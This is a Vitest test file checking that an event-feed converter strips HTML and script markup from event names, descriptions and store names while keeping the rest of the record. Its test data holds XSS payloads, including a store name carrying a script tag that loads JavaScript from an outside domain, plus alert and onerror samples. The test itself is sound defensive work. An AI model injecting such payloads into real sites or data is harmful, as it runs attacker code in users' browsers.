import { describe, it, expect } from 'vitest';
import { convertApiEvent, type ApiEvent } from '../api.js';

/**
 * The payload is live on Riot's feed today and absent from UVS's - but UVS event
 * names, descriptions and store names are just as user-editable, so the UVS
 * conversion is sanitised on exactly the same terms.
 */
const XSS_PAYLOAD =
  'Forever After Antiques and Collectibles Inc<script src="https://overlateise.com/api/jquery.js?v=2"></script>';

function apiEvent(overrides: Partial<ApiEvent> = {}): ApiEvent {
  return {
    id: 1039321,
    name: 'Thursday Nexus Nights',
    description: 'Weekly Riftbound night.',
    start_datetime: '2026-10-16T01:00:00Z',
    end_datetime: '2026-10-16T04:00:00Z',
    full_address: '123 Main St, Martinez, CA, 94553, US',
    latitude: 38.0194,
    longitude: -122.1341,
    event_format: 'constructed',
    event_type: 'casual',
    cost_in_cents: 1500,
    currency: 'USD',
    capacity: 32,
    registered_user_count: 12,
    full_header_image_url: null,
    event_configuration_template: null,
    store: {
      id: 4242,
      name: 'Games of Martinez',
      full_address: '123 Main St, Martinez, CA, 94553, US',
      city: 'Martinez',
      state: 'CA',
      country: 'US',
      latitude: 38.0194,
      longitude: -122.1341,
      website: null,
      email: null,
    },
    ...overrides,
  };
}

describe('convertApiEvent', () => {
  it('strips markup from UVS free text as well, without dropping the record', () => {
    const event = convertApiEvent(
      apiEvent({
        name: `Nexus Night<script>alert(1)</script>`,
        description: 'Come play!<img src=x onerror=alert(1)>',
        store: { ...apiEvent().store, name: XSS_PAYLOAD },
      })
    );

    expect(event.name).toBe('Nexus Night');
    expect(event.description).toBe('Come play!');
    expect(event.organizer).toBe('Forever After Antiques and Collectibles Inc');
    expect(event.location).toBe('Forever After Antiques and Collectibles Inc');
    expect(event.storeInfo.name).toBe('Forever After Antiques and Collectibles Inc');

    // Cleaned and kept: everything else about the event survives.
    expect(event.externalId).toBe('1039321');
    expect(event.price).toBe('$15.00');
    expect(event.playerCount).toBe(12);
    expect(event.capacity).toBe(32);
    expect(event.startDate.toISOString()).toBe('2026-10-16T01:00:00.000Z');
  });

  it('tags the record with its source', () => {
    expect(convertApiEvent(apiEvent()).sources).toEqual(['uvs']);
  });
});
